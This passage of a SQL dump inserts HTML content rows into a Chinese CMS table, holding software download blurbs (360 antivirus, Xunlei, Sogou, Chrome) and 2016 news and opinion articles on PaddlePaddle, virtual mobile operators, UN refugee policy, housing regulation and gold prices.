、更好的资源。</p><p>5、本站提供的一些商业软件是供学习研究之用，如用于商业用途，请购买正版。</p><p><strong><br/></strong><br/></p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (71,'<p>百度公司推出的一款云服务产品。支持便捷地查看、上传、下载百度云端各类数据。通过百度云管家存入的文件，不会占用本地空间。上传、下载文件过程更稳定。</p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (72,'<p>360杀毒软件下载2016官方下载版是永久免费杀毒软件,360杀毒软件下载免费版开创了杀毒软件免费杀毒的先河.本站提供360杀毒软件下载2016官方下载.360杀毒通过对用户反馈的持续关注与分析，我们进一步改进了针对浏览器不能上网的问题的扫描和自动修复逻辑。您通过快速或是全盘扫描就能够对该类问题进行快速修复!还有大幅优化了开机过程中对CPU和IO的占用，大大减少了对系统开机过程的影响。</p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (100,'<p>《诺亚传说》是尚游游戏自主研发的大型角色扮演网游，新资料片《诺亚传说前传-亚特兰蒂斯》火爆发布。</p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (101,'<p>迅雷9是“深圳市迅雷网络技术有限公司”于2016年推出的“迅雷”系列下载软件的最新换代产品。迅雷9采用全新下载引擎，对百兆光纤宽带网络环境进行诸多针对性的优化，让用户获得更卓越的下载体验；全新的界面功能布局，承载了更丰富的内容，打造找、下、用的一站式娱乐消费平台。</p><p>开发商：深圳市迅雷网络技术有限公司</p><p>软件官网：&nbsp;http://xl9.xunlei.com</p><p>新版特征</p><p>1、全新上线资源评论功能，进入资源详情页，参与精彩讨论；<br/>2、新增磁盘缓存设置功能；<br/>3、个性化中心新增“人气”“精品”“超级会员”提示，帮你找到个性化皮肤和头像。</p><p><br/></p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (102,'<p>软件介绍：<br/>&nbsp; 1.360安全卫士是一款由奇虎360公司推出的功能强、效果好、受用户欢迎的安全杀毒软件<br/>&nbsp; 2.目前4.2亿中国网民中，首选安装360的已超过3亿<br/>&nbsp; 3.拥有查杀木马、清理插件、修复漏洞、电脑体检、电脑救援、保护隐私，电脑专家，清理垃圾，清理痕迹多种功能<br/>&nbsp; 4.独创了&amp;ldquo;木马防火墙&quot;&amp;ldquo;360密盘&amp;rdquo;等功能<br/>&nbsp; 5.依靠抢先侦测和云端鉴别，可全面、智能地拦截各类木马，保护用户的帐号、隐私等重要信息<br/>&nbsp; 6.内含的360软件管家还可帮助用户轻松下载、升级和强力卸载各种应用软件</p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (103,'<p>搜狗（sougou）拼音输入法是一款Windows平台下的汉字拼音输入法。搜狗拼音输入法是基于搜索引擎技术的、特别适合网民使用的、新一代的输入法产品，用户可以通过互联网备份自己的个性化词库和配置信息。</p><p>开发商：搜狗</p><p>软件官网：&nbsp;http://pinyin.sogou.com/</p><p>新版特征</p><p>升级日志：<br/>1、标点补全：对（）、“”等成对的符号自动补全；<br/>2、图片表情：<br/>a）更新emoji资源和候选位置；<br/>b）支持表情包名搜索；<br/>3、拆分输入：增加更多拆分输入数据；<br/>4、网址直达：增加更多的网址数据；<br/>5、工具箱：更新工具箱图标，界面更美观；<br/>6、解决自定义短语、固定首位等删除之后同步又出现的问题。</p><p><br/></p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (104,'<p>歪歪语音是广州多玩信息技术有限公司研发的一款基于Internet 团队语音通信平台，功能强大、音质清晰、安全稳定、不占资源、适应游戏玩家的免费语音软件。在网络上通常用YY表示。</p><p>开发商：多玩游戏</p><p>软件官网：&nbsp;http://www.yy.com/index/t/download</p><p>新版特征</p><p>优化了部分内容。</p><p><br/></p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (105,'<p>阿里旺旺专为淘宝会员量身定做的个人交易沟通软件，方便买家和卖家在交易过程实时进行沟通。可以进行文字聊天、语音聊天、视频聊天、文件传输、发送离线文件等。有了它，用户就算有万水千山阻隔亦可零距离地与卖家交流宝贝细节，尽情“砍价”了！</p><p>开发商：阿里巴巴</p><p>软件官网：&nbsp;http://www.taobao.com/wangwang/</p><p>新版特征</p><p>1. 全新界面，清晰的圆形头像、轻薄的图标设计、界面结构更加简洁；<br/>2. 全新会话面板，汇总各类消息提醒，处理更高效；&nbsp;<br/>3. 皮肤设置升级，新增多款皮肤主题，带给你全新感觉；<br/>4. 拟物化登陆动画，简洁、灵动，一试难忘；<br/>5. 新增”星标好友“分组，方便找到重要联系人；<br/>6. 主面板新增快捷店铺入口，快速访问好友店铺；<br/>7. 消息管理器优化，重新梳理消息类型和菜单项，分类清晰.查找便捷；<br/>8. 旺旺个人资料和名片全新设计，支持设置个性背景图；<br/>9. 软件升级优化，让您第一时间了解新版本的功能；<br/>10. 文件发送完成后自动关闭发送框，在聊天窗口中实时穿透传输结果；<br/>11. 聊天窗口合并优化，同时和多人聊天更方便；<br/>12. 应用平台全新升级，访问更便捷，应用消息更直观。</p><p><br/></p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (106,'<p>爱奇艺视频桌面版3.0是一款专注视频播放的客户端软件，免费下载安装，观看高清正版影视，可在线享受爱奇艺网站内全部免费高清正版视频、最新影视大片、最独家的综艺、旅游、纪录片，支持全网搜索，是最个性化、时尚化的视频客户端。</p><p>开发商：北京爱奇艺科技有限公司</p><p>软件官网：&nbsp;http://www.iqiyi.com/</p><p>新版特征</p><p>1. 提升系统稳定性。</p><p><br/></p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (107,'<p>谷歌浏览器稳定版（Chrome）是一个由Google（谷歌）公司开发的开放原始码网页浏览器。该浏览器是基于其他开放原始码软件所撰写，包括WebKit和Mozilla，目标是提升稳定性、速度和安全性，并创造出简单且有效率的使用者界面。</p><p>开发商：谷歌</p><p>软件官网：&nbsp;http://www.google.cn/intl/zh-CN/chrome/browser/desktop/index.html</p><p>新版特征</p><p>1. 修复了部分bug问题。</p><p><br/></p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (108,'<p>360浏览器是互联网上最好用、最安全的新一代浏览器，和360安全卫士、360杀毒等软件等产品一同成为360安全中心的系列产品。木马已经取代病毒成为当前互联网上最大的威胁，90%的木马用挂马网站通过普通浏览器入侵，每天有200万用户访问挂马网站中毒。360安全浏览器拥有全国最大的恶意网址库，采用恶意网址拦截技术，可自动拦截挂马、欺诈、网银仿冒等恶意网址。独创沙箱技术，在隔离模式即使访问木马也不会感染。除了在安全方面的特性，360安全浏览器在速度、资源占用、防假死不崩溃等基础特性上表现同样优异，在功能方面拥有翻译、截图、鼠标手势、广告过滤等几十种实用功能，在外观上设计典雅精致，是外观设计最好的浏览器，已成为广大网民使用浏览器的第一选择。</p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (109,'<p>PPTV网络电视是PPLive旗下产品，一款安装量大的P2P网络电视软件，支持对海量高清影视内容的直播+点播功能。可在线观看电影、电视剧、动漫、综艺、体育直播、游戏竞技、财经资讯等丰富视频娱乐节目。P2P传输，越多人看越流畅、完全免费，是广受网友推崇的上网装机必备软件。</p><p>开发商：上海聚力传媒技术有限公司</p><p>软件官网：&nbsp;http://www.pptv.com</p><p>新版特征</p><p>1、直播回看无限制，想看哪里看哪里；<br/>2、调整注册方式，手机注册更方便；<br/>3、程序猿们日夜兼程，保证您观影更流畅</p><p><br/></p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (110,'<p>腾讯视频播放器是腾讯视频旗下的客户端产品，是一款支持丰富内容的在线点播及电视台直播的软件。它采用了先进的P2P流媒体播放技术，可以确保在大量用户同时观看节目的情况下，节目依然流畅清晰；同时具有很强的防火墙穿透能力，为用户在任何网络环境下收看流畅的视频节目提供了有力保障。</p><p>开发商：腾讯</p><p>软件官网：&nbsp;http://v.qq.com/index.html</p><p>新版特征</p><p>1. 客户端专享1080P蓝光画质，全员免费观看和下载；<br/>2. 鼠标停留在播放进度条上可看到预览画面；<br/>3. 启动时提示上次观看内容；<br/>4. 优化了搜索的体验；<br/>5. 精选频道点击栏目标题可跳转；<br/>6. 优化了VIP会员频道的分类筛选。</p><p><br/></p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (111,'<p style=\"text-align: center;\"><img src=\"/u/cms/www/201610/10114510l7x1.jpg\" title=\"138683743.jpg\" alt=\"138683743.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">本月初的百度世界大会上，百度正式对外宣布，开源其深度学习平台PaddlePaddle，这也让百度成为国内首家开放深度学习技术平台的科技公司。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">徐伟表示，百度希望通过开放深度学习平台的方式，营造开发者社区，推动人工智能行业的发展。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">据徐伟介绍，该平台最初是百度研发的深度学习内部平台，项目于2013年启动，主要用于支持的百度产品，目前百度有超过30个产品应用到该深度学习平台，包括预测外卖送达时间、图文问答、商家好感度模型等。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在行业开放的大趋势下，百度决定将这一平台开源，现在所有的从事深度学习开发的开发人员均可以下载安装并使用百度的这一深度学习工具。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">除了百度以外，谷歌(微博)在去年底宣布开放其深度学习平台Tensorflow，此外，业内主流的深度学习平台还包括Facebook的Torch，加州伯克利大学的Caffe等。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">徐伟说，百度的PaddlePaddle平台具备易用、高效、灵活、可伸缩等特点，能够满足多种不同的应用开发需求。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在接受采访时，徐伟重点强调了该平台的易用性特征，他表示，相比谷歌的Tensorflow来说，开发者在使用PaddlePaddle时更容易上手，尤其是对于序列输入、稀疏输入和大规模数据的模型训练有着良好的支持，支持GPU运算、数据并行和模型并行，仅需少量代码就能训练深度学习模型，大大降低了用户使用深度学习技术的成本。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">徐伟说，让开发者决定使用哪个平台进行开发的决定因素主要包含几个方面，首先是该平台能否实现自己想实现的功能，其次是使用某平台实现起来的难度有多大，最后是效率有多高。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">本月底，PaddlePaddle将迎来开源后的首次重大更新，徐伟介绍称，此次更新主要是进一步完善对不同操作系统的支持、进一步完善说明文档以及解决不同安全环境下的问题等。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">百度开源人工智能技术引起了开发者社区的关注，Facebook深度学习研究员、曾参与谷歌Tensorflow研发的贾扬清评价称，PaddlePaddle有高质量的GPU代码、非常好的RNN（回归神经网络）设计，并且设计很干净，没有太多的抽象表达，这一点比Tensorflow好很多。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">徐伟表示，正式开源后，下一步的目标是进一步完善平台的易用性和性能，并增强与开发者群体的沟通，了解他们的需求。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在谈到人工智能行业的发展时，他认为，人工智能行业这两年出现爆发式增长，主要在语音识别、图像识别等领域出现了显著的突破。在谈到人工智能未来发展时，他表示乐观，并认为，未来可能的突破点在于自然语言识别、理解和处理以及机器翻译等方面，另外基于人工智能的”人工助手”的智能化程度也有望进一步加强。</p><p><br/></p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (112,'<p style=\"text-align: center;\"><img src=\"/u/cms/www/201610/10114715p0as.jpg\" title=\"138679801.jpg\" alt=\"138679801.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">自2013年12月首批企业获牌以来，虚拟运营商发展迅速，目前已有42家企业获得牌照。9月22日，在“ICT中国· 2016高层论坛”移动转售分论坛上，中国通信企业协会披露，目前移动转售业务用户数已超3500万，占全国移动用户人数2.67%。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">不过，移动转售行业也因实名制未落实到位出现诸多“乱象”，尤其“170”号段诈骗多发遭诟病，在“徐玉玉受骗致死”案等多个热点事件的舆论声讨中，虚拟运营商声誉受到重大打击，其融资也受到影响。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\"><strong>虚拟运营商“很受伤”</strong></p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">3年前，第一批企业获得牌照进入试点，中国移动(微博)虚拟运营业方缓缓起步，而经过几年的发展，这一行业已小有规模，不过“成长的烦恼”也使其备受困扰。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">中国通信企业协会披露的数据显示，移动转售业的发展速度有所下降。自2015年3月起，移动通信转售业务月净增超过100万户，其中2015年10月起连续6个月净增达到200万，然而自2016年1月以来，增速有所放缓，甚至出现“停滞”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">增速降低与行业乱象不无关联。女大学生徐玉玉被骗后昏聩致死使得社会的目光投向虚拟运营商，尤其是因为“实名制”再次被推上风口浪尖。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">据央广网2016年8月报道，工信部网络安全管理局对虚拟运营商新入网电话用户实名登记工作暗访，暗访的26家转售企业的109个营销网点中，37个网点存在违规行为，违规占比超三成。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">虚拟运营商“实名制”漏洞也成了舆论谴责的“靶子”。中兴视通显然备受折磨，其CEO邓慕超向与会者“倒苦水”，称自己有时“夜不能寐、梦不能求”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">巴士在线CEO王献蜀在业内摸爬滚打多年，也叫苦不迭，“170贴了一个标签，就是诈骗，虚商也变成了诈骗公司。”王献蜀表示，这让虚拟运营商要“很受伤”，并呼吁业内外应给予虚拟运营商“容错空间”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\"><strong>声誉受损融资受波及</strong></p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">中国虚拟运营业起步晚于发达国家，而虚拟运营商们盈利困难早已不是新闻，而今，命途多舛的它们又遇“拦路虎”，这也让资本市场对其发展前景打了个问号，虚拟运营商直接受到冲击。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">王献蜀称，“170”号段的问题影响了虚拟运营的融资。“我们很少听到说哪一家虚商拿了多少融资，然后怎么样，多么风光，虚商这个行业几乎都是每一家虚商，每一个老板，每一个企业真金白银自己从口袋里面往外掏钱。”王献蜀表示，从业几年来，他自己已经投入了1.8亿元。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">蜗牛移动CEO陈艳也深有体会，在她看来，虚拟运营商还是个“婴儿”，她表示，英国发展虚拟运营已有18年，虚拟运营的比例占到全行业的12%，而中国发展2、3年达到2.67%，未来还有很大发展空间，但她却感受到了行业内的恐慌。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">融资困境及舆论压力促进了虚拟运营商的反思。9月22日的论坛上，虚拟运营企业代表均坦承，虚拟运营商也是诈骗案的受害者，落实实名制可促使虚拟运营业健康发展。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">今年4月份，工信部发布了《关于加强规范管理，促进移动通信转售业务健康发展》的通知，向移动转售企业提出了落实移动用户实名登记要求的有关具体规定。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">据中国通信企业协会常务副会长兼秘书长苗建华介绍，整治以来，虚拟运营商采用系统整改、完善手段、有奖举报等一系列措施取得了一定的成效。</p><p><br/></p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (113,'<p style=\"text-align: center;\"><img src=\"/u/cms/www/201610/10114919rtom.jpg\" title=\"641.jpg\" alt=\"641.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">李克强总理首赴联合国，首场活动便是出席由联合国倡议举行的联大解决难移民大规模流动问题高级别会议。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">这是自联合国成立以来，首次召开的应对难移民问题的高级别会议。同时尤其值得注意的是，这也是中国领导人首次在此种国际场合阐述对于难移民问题的主张。总理的首场与联合国的首次，两者碰撞出怎样的火花?</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">人道主义的价值观，这是李克强主张的要旨。在联合国的讲台上，中国总理的视野超越国别和地域。他将难民和移民问题视为一场“拷问人类社会良知”的人道主义危机，因此郑重向国际社会发出呼吁：“每一个人的生命都是宝贵的，每一个人的尊严都应得到维护，人道主义精神必须弘扬。”中国传统政治伦理中有着人道主义的丰沛思想资源，李克强将其带到联合国讲台上，从而丰富了中国当代外交与政治的实践。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">与此相应，在联合国这个庄严的讲台上，李克强代表中国宣布的3项举措，实打实地彰显了基于人道主义的国际政治理念。中国将这样做：在原有援助规模的基础上，向有关国家和国际组织提供1亿美元的人道主义援助;积极研究把中国-联合国和平与发展基金的部分资金用于支持发展中国家难民移民工作;积极探讨同有关国际机构和发展中国家开展三方合作。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">怎么做，真金白银，某种意义上比怎么说更触及实质。然而这里面有一个厘清“责任观”的问题。中国作为联合国常任理事国，在难移民这一全球性议题上当然有义不容辞的责任。该出手时就出手，正如李克强在当天会议上所言，中国把人道主义援助视为“道义之举”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">同时，中国经济虽有了很大发展，但仍是发展中国家，愿意承担与自身能力相适应的责任。李克强在联合国所承诺的援助资金，是中国的量力而为，我们决不放空炮;所承诺的援助方式，比如使用和平与发展基金的部分资金、开展三方合作等，也是真正的“务实之举”。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">更关键的是，李克强的“说”与“做”，在一个更高层面上实现了统一，那就是发展。战乱冲突、贫穷落后是难移民问题的主要根源，实现真正的包容性增长方为治本之策。中国的主张和举措，牢牢把握住了解决问题最关键点——长远和根本地看，出路还蕴藏在发展这一主题中。这也是李克强一直以来在国际外交舞台上所强调的，以发展弥合伤痕、促进平衡、共同向前。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在联合国的首场活动，阐述理念、承诺硬招，李克强总理在这个最高的国际场合，展示了中国“软实力”。</p><p><br/></p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (130,'<p style=\"text-indent: 2em;\">细心的人会观察到，在发表2016年新年贺词的镜头中，习近平总书记办公室有了新变化：新添的7张照片中，有3张记录着总书记和民族地区各族干部群众一起谋发展、话小康的难忘瞬间。</p><p style=\"text-indent: 2em;\"><br/></p><p>　　民族工作关乎大局。党的十八大以来，以习近平同志为总书记的党中央高度重视民族工作，多次深入民族地区调研，体察少数民族群众冷暖。先后召开第二次中央新疆工作座谈会、中央民族工作会议、中央第六次西藏工作座谈会等，对民族工作作出全面部署，力度之大、频次之高、涉面之广、阐述之深，前所未有，一曲新形势下民族工作新乐章在中华大地奏响。</p><p><br/></p><p>　　保持定力：坚持走中国特色解决民族问题的正确道路</p><p><br/></p><p>　　2014年9月，中央民族工作会议在京召开。会上，习近平总书记在坚持党的民族理论政策基本原则的基础上，提出了一系列新思想新观点新举措，为新形势下民族工作提供了行动指南和基本遵循：</p><p><br/></p><p>　　——我国历史演进的这个特点，造就了我国各民族在分布上的交错杂居、文化上的兼收并蓄、经济上的相互依存、情感上的相互亲近，形成了你中有我、我中有你、谁也离不开谁的多元一体格局。</p><p><br/></p><p>　　——新中国成立65年来，党的民族理论和方针政策是正确的，中国特色解决民族问题的道路是正确的，我国民族关系总体是和谐的。</p><p><br/></p><p>　　——同世界上其他国家相比，我国民族工作做得都是最成功的。</p><p><br/></p><p>　　——中华民族和各民族的关系，形象地说，是一个大家庭和家庭成员的关系，各民族的关系是一个大家庭里不同成员的关系。</p><p><br/></p><p>　　——坚持中国特色解决民族问题的正确道路。</p><p><br/></p><p>　　——坚持和完善民族区域自治制度，要做到坚持统一和自治相结合，坚持民族因素和区域因素相结合。</p><p><br/></p><p>　　——做好民族工作，最关键的是搞好民族团结，最管用的是争取人心。</p><p><br/></p><p>　　——城市民族工作要把着力点放在社区，推动建立相互嵌入式的社会结构和社区环境。</p><p><br/></p><p>　　——加强中华民族大团结，长远和根本的是增强文化认同，建设各民族共有精神家园，积极培养中华民族共同体意识。</p><p><br/></p><p>　　——尊重差异、包容多样，通过扩大交往交流交融，创造各族群众共居、共学、共事、共乐的社会条件，让各民族在中华民族大家庭中手足相亲、守望相助。</p><p>　　……</p><p>　　中央民族工作会议的召开，统一思想、坚定信心，在新的历史起点上推动民族团结进步事业踏上新的时代征程。</p><p><br/></p><p>　　大政方针已定，关键就在落实。中央民族工作会议以来，以理论创新为先导，民族工作的政策创新、制度创新、实践创新不断推进。</p><p><br/></p><p>　　——出台贯彻落实《中共中央、国务院关于加强和改进新形势下民族工作的意见》的重要举措分工方案，包括16项47条，条条都是硬举措。相关部委组成联合督查组督促中央民族工作会议精神的贯彻落实。</p><p><br/></p><p>　　——时隔13年召开全国民族教育工作会议，首次召开全国城市民族工作会议……中央民族工作会议精神逐一贯彻，渐次落实。</p><p><br/></p><p>　　——全国31个省、自治区、直辖市和新疆生产建设兵团相继召开贯彻落实中央民族工作会议精神的会议，出台了相关配套文件。</p><p><br/></p><p>　　——为支持民族地区加快发展，输送“真金白银”，研究制定差别化政策：第一次对川甘青交界地区，对南疆四地州，对怒江、凉山、临夏等三个特困自治州，专门制定政策举措。</p><p><br/></p><p>　　——明确少数民族学生高考加分政策，对国家通用语言文字已经普及、教育水平大体相同的地区，逐步缩小差距，逐步做到一律平等；对语言文化差异较大、教育质量还不高的一些地区少数民族学生，除大力普及双语教育、调整专业设置、提高教学质量外，仍是实行高考加分政策，支持少数民族学生取得较好教育水平。</p><p><br/></p><p>　　两年来，中央民族工作会议精神在各地生根发芽、开花结果。</p><p><br/></p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (131,'<p style=\"text-align: center;\"><img src=\"/u/cms/www/201610/101353469a1k.jpg\" title=\"3c6d55fbb2fb43161e70f38528a4462308f7d3e6.jpg\" alt=\"3c6d55fbb2fb43161e70f38528a4462308f7d3e6.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">今年的国庆节注定是个不平凡的节日，北京、广州、深圳、苏州、合肥等20个一二线城市相继出台楼市限购限贷政策，“深八条”、“沪六条”等严厉调控措施相继出笼，犹豫在中国大地上引爆了无数颗原子弹，看得人眼花缭乱、心惊肉跳，让人感受到了中国楼市调控“变脸术”之快、之严。&nbsp;</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">社会各界姑且会猜测，这些调控措施付诸实施之后能否成为医治楼市癫狂的灵丹妙药？房地产业服了这些调控药之后是否能走上理性、健康发展轨道？中国民众是否从此不再有楼市猛涨带来的恐慌之虞？回答无疑是否定的。因为这些调控之“药”依然没有摆脱行政窠臼，其结局也就很难跳出行政调控怪圈：“严格管制房价暂时趋缓—放松管制房价暴涨”。也就是说，出台调控措施的这些城市，楼市价格上涨趋势可能暂时会缓一缓，但过后可能又将迎来新一轮量价齐涨周期。因为中国从2005年3月底的“国八条”算起，短短十年间，中国房地产市场虽经历过无数次调控，无论是国务院的各项“通知”，还是九部委、七部委的各种“意见”，都没能阻挡住房价上涨的步伐；不少城市的房价比2005年翻了几番甚至十番都不止。每一轮调控政策都是为稳定住房价格，但调控过后，总有一轮快速上涨行情，越让普通百姓感叹房子越来越买不起了。显然，目前楼市调控实质已陷入越调越高和政府“助涨”的尴尬局面。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">这是为什么呢？道理其实很简单，因为我们楼市调控政策存在严重问题：一是没有理顺楼市调控的目的到底是什么，是控制住房价让老百姓买得起房，还是不要过于严厉让房地产开发商能有钱赚和地方财政有收入可进？正因为楼市调控政策总是处于摇摆不定状态，忽而严厉、忽而放松，缺乏长久可持续调控政策措施，让房地产开发商及各级地方政府形成了“耐药性”，使调控功效被抵消。二是没有割断地方政府与房地产业发展之间的各种利益关系，是让楼市调控步入市场运行机制、让市场充分发挥自发调节作用，还是继续伸出行政权力之手来生硬地管制房价或分割利益？由于这种利益关系没理顺，使一些地方政府难下决心认真调控，致使调控政策得不到认真落实走形变样；同时也会更加诱发一些地方政府竭力追求土地财政、推高房价获得足够收入搞高楼房、宽马路等城市形象政绩工程建设，使调控陷入了“死胡同”。三是没有足够底牌或也不愿意拿出有效手段来对冲楼市上涨带来的压力，使楼市调控政策软弱无力。比如保障房、经济适用房等建设速度缓慢、数量严重短缺，把一大批城市中低收入人群也逼向商品房购买行列，更加剧了楼市非理性上涨；也让政府对楼市非正常上涨现象缺乏必要平抑措施，只能望楼市价格上涨兴叹。四是对楼市上涨失控城市政府调控不力、楼市中存在各种违规行为及投机炒作行为缺乏必要法治惩治手段，使楼市失常状况难得到及时扭转。如调控政策出台之后，没有一个地方政府领导因楼市调控措施落实不力受到严肃问责，丢下官帽；没有一个开发商因弄虚作假、违规开发而被罚得倾家荡产；更没有一个楼市投机炒作者被追究刑责入狱。于是地方政府调控措施执行不力已司空见惯，开发商违规行为让人熟视无睹，投机商哄抬房价打乱楼市现象更是让人见怪不怪。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">由此，目前中国一二线城市楼市调控政策不能只求一时轰动效应，而应把追求实实在在的长久调控效果放在首位，推动楼市调控彻底走出“屡涨屡调，屡调屡涨”怪圈：首先，制定富有弹性的楼市调控政策，确立楼市调控近期目标、中期目标和长远目标，分阶段实施，消除狂风暴雨式调控模式；把楼市调控政策制定要交给各级地方政府，建立目标考核责任制，将其纳入施政目标，让民众来打分评价，对民众不满意或房价涨幅过大的地方政府领导实施行政降级、行政记过、诫勉谈话等问责处罚，增强楼市调控政策的严肃性。其次，进一步厘清行政干预与市场调节的界限，确立地方政府在房地产市场中的责任；将房地产市场纳入法治监管轨道，对楼市调控不力的地方政府、违法违规的房地产开发及哄抬房价扰乱楼市秩序的投机商追究刑事责任，增强楼市调控的法治威慑力。再次，应尽快终结土地财政，加快税收制度改革步伐，将中央政府与地方政府事权与财权改革到位，消除地方政府对土地财政的依赖，楼市疯狂暴涨和挤泡沫才真正有希望。</p><p><br/></p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (132,'<p style=\"text-align: center;\"><img src=\"/u/cms/www/201610/10135526bcqb.jpg\" title=\"908fa0ec08fa513da2f6fc21356d55fbb3fbd9f5.jpg\" alt=\"908fa0ec08fa513da2f6fc21356d55fbb3fbd9f5.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">三年前，中国大妈们抢购黄金的记忆还历历在目，没想到如今的黄金又开始了一轮又一轮的下跌。接连的破位下跌，再次有人开始蠢蠢欲动，想着投资抄底，再加上中国房地产市场的调控力度不断加大，那么会不会有一部分投资热钱也会进入到黄金市场呢？其实，投资市场历来有句名言是买涨不买跌。不过，对于黄金这种相对常见的避险投资工具来说，很多人买了就是资产配置和“囤货”，并不是简单的投资或者快速的出手，她们持有的耐心和时间更长，因此任何一个低价的出现，都有可能成为触发市场投资的一种诱惑。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">连续下跌，何时是个头？</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">今年的“十一黄金周”期间，黄金价格已经跌破1,300美元/盎司的重要支撑。10月1日～7日，纽约商业交易所（COMEX）黄金大跌4.5%，创下一年来最大单周跌幅，其中上周二跌幅超过3.3%，也创下了2013年12月以来单日最大跌幅。10月4日，现货金价一度跌破1270美元/盎司关口，白银一度跌破18美元关口，跌幅超过5%，多次刷新英国脱欧公投以来最低。市场对欧佩克限产协议不断炒作，原油看涨情绪升温。这都使黄金的价格不被看好。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">市场对全球央行货币政策转向，担忧流动性逆转是黄金下跌的主要原因。其实在8月份之后，全球资本市场人士普遍猜测，各国将统一行动，主要在结构性改革、财政政策上发力，货币政策可能接近极限，全球的流动性将很快出现逆转。黄金价格的剧烈波动，就是对这一猜测的又一次市场反应。如果全球货币宽松走到尽头，那么利率将缓慢上升，全球的债券牛市也将终结。</p><p 